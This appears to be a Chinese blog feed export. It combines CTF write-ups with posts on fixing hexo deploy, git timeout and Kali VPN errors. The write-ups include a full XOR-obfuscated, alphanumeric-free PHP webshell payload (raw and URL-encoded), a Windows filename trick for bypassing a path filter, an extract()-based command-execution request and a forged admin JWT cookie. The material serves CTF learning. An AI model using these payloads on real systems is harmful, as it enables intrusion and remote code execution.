<p><img src="https://img.npfs06.top/20210331195107.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>get类可以进行文件读取，并且在最后面有个include操作，所以猜侧具体思路是写文件，然后用include包含执行。<br>传入文件名和PUT类类似，可控，但是要经过path_sanitizer函数过滤，并且也会在前面自动拼接./files/。不过有一点不同之处，如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$read_file</span> = <span class="string">&quot;./files/&quot;</span> . <span class="keyword">$this</span>-&gt;filename;</span><br><span class="line"><span class="variable">$read_file_with_hardened_filter</span> = <span class="string">&quot;./files/&quot;</span> . path_sanitizer(<span class="keyword">$this</span>-&gt;filename, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>这里path_sanitizer函数第二个参数为真，会在原过滤的基础上把正反斜杠替换为空<br>经过两种过滤方式输出的文件名和文件内容都必须不一样，否者就直接返回了，这段代码通过后就会<code>@include(&quot;./files/&quot; . $this-&gt;filename);</code>，所以我们只要绕过这个if判断就可以包含了</p>
<p>对于Windows的文件读取，有一个小Trick：使用<code>FindFirstFile</code>这个API的时候，其会把<code>&quot;</code>解释为<code>.</code>。意即：<code>shell&quot;php</code> === <code>shell.php</code>。</p>
<p>因此，回到这题来。我们上传一个文件，名字设为<code>test</code>。然后，通过<code>&quot;/test</code>即可读取。此时：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$read</span>_file = <span class="string">&quot;./files/./test&quot;</span>;</span><br><span class="line"><span class="symbol">$read</span>_file_with_hardened_filter = <span class="string">&quot;./files/.test&quot;</span>;</span><br><span class="line">file_get_contents(<span class="symbol">$read</span>_file) = <span class="string">&#x27;实际文件内容&#x27;</span>;</span><br><span class="line">file_get_contents(<span class="symbol">$read</span>_file_with_hardened_filter) = <span class="literal">false</span> <span class="comment">//文件不存在</span></span><br></pre></td></tr></table></figure>
<p>这样就绕过了文件名的限制</p>
<p>最后就是构建无字母数字shell了<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p>这里采用异或的方法</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;?=</span><span class="variable">$__</span><span class="operator">=</span>(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;)&quot;</span><span class="operator">^</span><span class="string">&quot;@&quot;</span>).(<span class="string">&quot;-&quot;</span><span class="operator">^</span><span class="string">&quot;@&quot;</span>);((<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;_&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;]&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>))(((<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;$&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>))((((<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;<span class="subst">\\</span>&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;(&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">-!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="variable">$__</span>(<span class="operator">!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span><span class="operator">+!</span>@<span class="variable">$_</span>)).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;=&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;_&quot;</span>).(<span class="string">&quot;;&quot;</span><span class="operator">^</span><span class="string">&quot;^&quot;</span>).(<span class="string">&quot;<span class="subst">\\</span>&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>).(<span class="string">&quot;]&quot;</span><span class="operator">^</span><span class="string">&quot;.&quot;</span>))())))<span class="operator">?&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="variable">%3</span>C<span class="variable">%3</span>F<span class="variable">%3</span>D<span class="variable">%24</span>__<span class="variable">%3</span>D(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span>)<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%40</span><span class="variable">%22</span>).(<span class="variable">%22</span>-<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%40</span><span class="variable">%22</span>)<span class="variable">%3</span>B((<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>_<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>))(((<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%24</span><span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>))((((<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>(<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_-!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%24</span>__(!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_<span class="variable">%2</span>B!<span class="variable">%40</span><span class="variable">%24</span>_)).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%3</span>D<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>_<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%3</span>B<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>C<span class="variable">%5</span>C<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>).(<span class="variable">%22</span><span class="variable">%5</span>D<span class="variable">%22</span><span class="variable">%5</span>E<span class="variable">%22</span>.<span class="variable">%22</span>))())))<span class="variable">%3</span>F<span class="variable">%3</span>E<span class="variable">%0</span>A</span><br></pre></td></tr></table></figure>


<p><img src="https://img.npfs06.top/20210331185008.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>hexo d时发生error:spawn failed报错的解决方法</title>
    <url>/2023/09/22/hexo-d%E6%97%B6%E5%8F%91%E7%94%9Ferror-spawn-failed%E6%8A%A5%E9%94%99%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>hexo d时发生error:spawn failed报错的解决方法</p>
<a id="more"></a>

<p>博客<code>hexo d</code>上传GitHub时出现报错：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">FATAL &#123;</span><br><span class="line">  err: Error: Spawn failed</span><br><span class="line">      at ChildProcess.&lt;anonymous&gt; (D:<span class="symbol">\P</span>rogram Files<span class="symbol">\b</span>log<span class="symbol">\h</span>exo<span class="symbol">\n</span>ode_modules<span class="symbol">\h</span>exo-util<span class="symbol">\l</span>ib<span class="symbol">\s</span>pawn.js:51:21)</span><br><span class="line">      at ChildProcess.emit (events.js:315:20)</span><br><span class="line">      at ChildProcess.cp.emit (D:<span class="symbol">\P</span>rogram Files<span class="symbol">\b</span>log<span class="symbol">\h</span>exo<span class="symbol">\n</span>ode_modules<span class="symbol">\c</span>ross-spawn<span class="symbol">\l</span>ib<span class="symbol">\e</span>noent.js:34:29)</span><br><span class="line">      at Process.ChildProcess._handle.onexit (internal/child_process.js:277:12) &#123;</span><br><span class="line">    code: 128</span><br><span class="line">  &#125;</span><br><span class="line">&#125; Something&#x27;s wrong. Maybe you can find the solution here: <span class="variable">%s https://hexo.io/docs/troubleshooting.html</span></span><br><span class="line"><span class="variable">INFO  See you again</span></span><br><span class="line"><span class="variable"></span></span><br></pre></td></tr></table></figure>


<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">问题大多是因为git进行push或者hexo d的时候改变了一些`.deploy_git`文件下的内容</span><br></pre></td></tr></table></figure>

<p>直接将hexo目录下的<code>.deploy_git</code>和<code>public</code>删除</p>
<p><img src="https://img.npfs06.top/20230922145123.png"></p>
<p>（不用担心删除会导致博客出错，hexo g的时候会重新生成这两个文件）</p>
]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>git连接报错 fatal: unable to access ‘https://github.com……‘: Failed to connect to</title>
    <url>/2023/09/22/git%E8%BF%9E%E6%8E%A5%E6%8A%A5%E9%94%99-fatal-unable-to-access-%E2%80%98https-github-com%E2%80%A6%E2%80%A6%E2%80%98-Failed-to-connect-to/</url>
    <content><![CDATA[<p>git 连接报错 fatal: unable to access ‘<a href="https://github.com/xxxxxx.git/&#39;">https://github.com/xxxxxx.git/&#39;</a>: Failed to connect to github.com port 443: Timed out 解决办法</p>
<a id="more"></a>

<p>但是我把这两个文件删除，重新执行<code>hexo g -d</code>命令之后，出现了新的报错</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">fatal: unable <span class="keyword">to</span> <span class="keyword">access</span> <span class="string">&#x27;https://github.com/npfs06/npfs06.github.io.git/&#x27;</span>: Failed <span class="keyword">to</span> <span class="keyword">connect</span> <span class="keyword">to</span> github.com port <span class="number">443</span>: Timed <span class="keyword">out</span></span><br></pre></td></tr></table></figure>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>本地cmd开个命令窗口，清下缓存</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /flushdns </span><br></pre></td></tr></table></figure>
<p>请问缓存等个30秒</p>
<p>再执行<code>hexo g -d</code> 就不会报超时了</p>
]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>kali连接hackthebox的vpn失败的解决方法</title>
    <url>/2023/09/25/kali%E8%BF%9E%E6%8E%A5hackthebox%E7%9A%84vpn%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>kali连接vpn失败,报错OpenSSL: error:0A000086:SSL routines::certificate verify failed的解决办法</p>
<a id="more"></a>

<p>本来想玩下htb的靶场的，但是kali连vpn的时候莫名其妙就报错了，前段时间还好好的。报错如下</p>
<p><img src="https://img.npfs06.top/20230925093028.png"></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> OpenSSL: error:<span class="number">0</span>A<span class="number">000086</span>:SSL routines::certificate verify failed</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> TLS_ERROR: BIO read tls_read_plaintext error</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> TLS Error: TLS object -&gt; incoming plaintext read error</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> TLS Error: TLS handshake failed</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> SIGUSR<span class="number">1</span>[soft,tls-error] received, process restarting</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">01</span> Restart pause, <span class="number">16</span> second(s)</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">17</span> TCP/UDP: Preserving recently used remote address:<span class="meta"> [AF_INET]142.234.200.47:1337</span></span><br><span class="line"><span class="meta">2023-09-25 09:30:17 Socket Buffers: R=[212992-&gt;212992] S=[212992-&gt;212992]</span></span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">17</span> UDPv<span class="number">4</span> link local: (not bound)</span><br><span class="line"><span class="attribute">2023</span>-<span class="number">09</span>-<span class="number">25</span> <span class="number">09</span>:<span class="number">30</span>:<span class="number">17</span> UDPv<span class="number">4</span> link remote:<span class="meta"> [AF_INET]142.234.200.47:1337</span></span><br><span class="line"><span class="meta">2023-09-25 09:30:17 TLS: Initial packet from [AF_INET]142.234.200.47:1337, sid=f40f59c3 995f1c21</span></span><br><span class="line"><span class="meta">2023-09-25 09:30:17 VERIFY ERROR: depth=0, error=CA signature digest algorithm too weak: C=UK, ST=City, L=London, O=HackTheBox, CN=htb, name=htb, emailAddress=info@hackthebox.eu, serial=1</span></span><br></pre></td></tr></table></figure>


<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>试了下本机是可以正常连上的，问题应该就是出在了kali上，网上找了半天资料，也没看到有相应的解决办法。</p>
<p>以为是kali被我搞坏了，去官网下载了最新版的2023.3  ，但是发现还是报错</p>
<p>原因可能是因为该操作系统移除了Openssl的MD5支持，但是openssl仍然默认以md5作为散列算法并且可以正确识别md5散列算法。</p>
<p>所以我重新找了个老版本kali安装，发现可以成功连接openvpn</p>
<p>kali安装包</p>
<p>使用腾讯微云下载：<a href="https://share.weiyun.com/5i4WF8PE%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9Ae83wzc%EF%BC%89%E3%80%82">https://share.weiyun.com/5i4WF8PE（密码：e83wzc）。</a><br>该链接包含了kali-linux-2020-2-vmware-amd64-7z.torrent种子文件，并提供了下载好的kali-linux-2020.2-vmware-amd64.7z虚拟机镜像文件以及用于校验sha256算法文件完整性的kali-linux-2020.2-vmware-amd64.7z.txt.sha256sum文件，下载后请自行校验文件的完整性。</p>
]]></content>
      <categories>
        <category>problems</category>
      </categories>
  </entry>
  <entry>
    <title>某省税务比赛题目CTF</title>
    <url>/2023/11/23/%E6%9F%90%E7%9C%81%E7%A8%8E%E5%8A%A1%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AECTF/</url>
    <content><![CDATA[<p>某省税务比赛题目CTF</p>
<a id="more"></a>

<h2 id="web832"><a href="#web832" class="headerlink" title="web832"></a>web832</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络安全为人民</span><br></pre></td></tr></table></figure>
<h2 id="web833"><a href="#web833" class="headerlink" title="web833"></a>web833</h2><p>根据提示，让问url/robots.txt，然后下载check.php.bak</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFilter</span>(<span class="params"><span class="variable">$index</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$index</span>;</span><br><span class="line">    <span class="variable">$filter</span>=[<span class="string">&quot;strip_tags&quot;</span>,<span class="string">&quot;addslashes&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$index</span>?<span class="variable">$filter</span>[<span class="number">1</span>]:<span class="variable">$filter</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHandle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=getFilter();</span><br><span class="line">    <span class="variable">$say</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$array</span></span>) <span class="title">use</span> (<span class="params">&amp;<span class="variable">$filter</span></span>)</span>&#123;</span><br><span class="line">        extract(<span class="variable">$array</span>);</span><br><span class="line">        <span class="variable">$hello</span>=<span class="variable">$filter</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$hello</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span>=getHandle();</span><br><span class="line"><span class="variable">$message</span>=<span class="string">&quot;hello &quot;</span>.<span class="variable">$msg</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码匿名函数那部分有点难懂，借用gpt的解释</p>
<p><img src="https://img.npfs06.top/20231123103417.png"></p>
<p>对于匿名函数中的$array变量来源可以这么理解</p>
<p><img src="https://img.npfs06.top/20231123103528.png"></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">url/<span class="keyword">check</span>.php?<span class="keyword">filter</span>=<span class="keyword">system</span>，然后POST传入<span class="type">name</span>=cat /flag_is_here</span><br></pre></td></tr></table></figure>




<h2 id="web834"><a href="#web834" class="headerlink" title="web834"></a>web834</h2><p>仔细审题  秘钥111111</p>
<p><img src="https://img.npfs06.top/20231123104330.png"></p>
<p>任意用户注册，修改密码，抓包，注意到cookie有个username，像jwt格式</p>
<p><img src="https://img.npfs06.top/20231123104146.png"></p>
<p>改成admin  , 秘钥111111</p>
<p><img src="https://img.npfs06.top/20231123104445.png"></p>
<p>替换原cookie， 成功修改admin密码</p>
<h2 id="web835"><a href="#web835" class="headerlink" title="web835"></a>web835</h2><ol>
<li>根据题目提示，输入admin 123456登陆</li>
<li>根据提示，文件是hbsw7.zip</li>
<li>打开源码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$action</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">        doUpload();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;include&quot;</span>:</span><br><span class="line">        doInclude();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="string">&quot;nothing here&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doInclude</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/log|php|tmp/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error filenname&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doUpload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span>=file_get_contents(<span class="variable">$tmp_name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_filename(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(filter_content(<span class="variable">$content</span>))&#123;</span><br><span class="line">        <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传失败&quot;</span>];</span><br><span class="line">        <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file(<span class="variable">$tmp_name</span>,<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$ret</span> = [<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件上传成功,文件路径为  /var/www/html/upload/&quot;</span>.<span class="variable">$file</span>];</span><br><span class="line">    <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_filename</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ban_ext</span>=<span class="keyword">array</span>(<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = end(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">return</span> !in_array(<span class="variable">$file_ext</span>,<span class="variable">$ban_ext</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_content</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&quot;/php|include|require|get|post|request/i&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
